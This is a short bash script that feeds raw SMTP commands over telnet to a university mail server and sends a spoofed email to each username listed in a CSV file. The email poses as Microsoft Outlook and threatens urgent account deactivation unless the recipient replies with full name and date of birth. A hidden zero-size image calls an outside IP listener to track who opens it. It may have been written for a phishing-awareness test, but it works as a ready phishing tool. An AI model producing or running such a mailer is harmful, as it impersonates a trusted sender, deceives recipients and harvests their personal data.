#!/bin/bash

(
sleep 2
echo helo usr
sleep 2
while IFS=, read col1
	do
	echo "MAIL FROM:noreply@outlook.microsoft.com"
	sleep 2
	echo "RCPT TO:${col1}@anu.edu.au"
	sleep 2
	echo Data
	sleep 2
	echo "From: noreply@outlook.microsoft.com"
	sleep 2
	echo "To: ${col1}@anu.edu.au;"
	sleep 2
	echo "Reply-To: u5162336@anu.edu.au"
	sleep 2
	echo "Subject: *De-activation of account URGENT*"
	sleep 2
	echo "Mime-Version: 1.0;"
	sleep 2
	echo "Content-Type: text/html; charset="ISO-8859-1";"
	sleep 2
	echo "Content-Transfer-Encoding: 7bit;"
	sleep 2
	echo "<html>"
	echo "<body>"
	echo "We are undergoing a review of current email accounts in an attempt to eliminate fake email accounts."
	echo ""
	echo "To keep your account active, please respond to this email with the following information:"
	echo ""
	echo "Full Name:"
	echo "Date of Birth"
	echo ""
	echo "Please note, your account will be automatically de-activated if we do not recieve this information within 24 hours."
	echo ""
	echo "We apologise for any inconvenience and appreciate your understanding."
	echo ""
	echo "Thank you."
	echo "Copyright © 2016 MailServer Inc."
	echo "<placeholder for the php script>"
	echo "<img src="http://150.203.139.148/listeners/redir.php" height=0 width=0 />"
	echo "</body>"
	echo "</html>"
	sleep 2
	echo "."
	sleep 2
	echo exit
done < testlist.csv
)|telnet smtphost.anu.edu.au 25 
